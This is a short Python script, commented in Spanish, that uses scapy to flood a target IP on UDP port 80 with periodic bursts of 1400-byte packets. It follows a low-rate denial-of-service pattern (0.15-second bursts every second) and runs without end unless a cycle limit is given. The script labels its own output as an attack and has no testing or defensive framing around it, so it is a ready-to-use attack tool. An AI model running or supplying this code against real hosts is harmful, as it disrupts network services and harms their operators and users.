#!/usr/bin/env python3
"""Inyección periódica de ráfagas LDoS (T=1.0, L=0.15)."""
import sys
import time
from scapy.all import IP, UDP, send


def inyectar_rafaga_ldos(target_ip, periodo_t, duracion_l, max_ciclos=0):
    puerto_destino = 80
    payload_saturacion = b"X" * 1400
    print(f"[*] Iniciando impulsos LDoS hacia {target_ip} (T={periodo_t}s, L={duracion_l}s)...")
    ciclos = 0
    try:
        while max_ciclos == 0 or ciclos < max_ciclos:
            tiempo_inicio = time.time()
            while (time.time() - tiempo_inicio) < duracion_l:
                packet = IP(dst=target_ip) / UDP(dport=puerto_destino) / payload_saturacion
                send(packet, verbose=False)
            tiempo_procesado = time.time() - tiempo_inicio
            tiempo_espera = max(0.0, periodo_t - tiempo_procesado)
            time.sleep(tiempo_espera)
            ciclos += 1
    except KeyboardInterrupt:
        print("\n[-] Ataque LDoS detenido.")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 ldos.py <IP_Destino> [max_ciclos]")
        sys.exit(1)
    ciclos = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    inyectar_rafaga_ldos(sys.argv[1], 1.0, 0.15, ciclos)
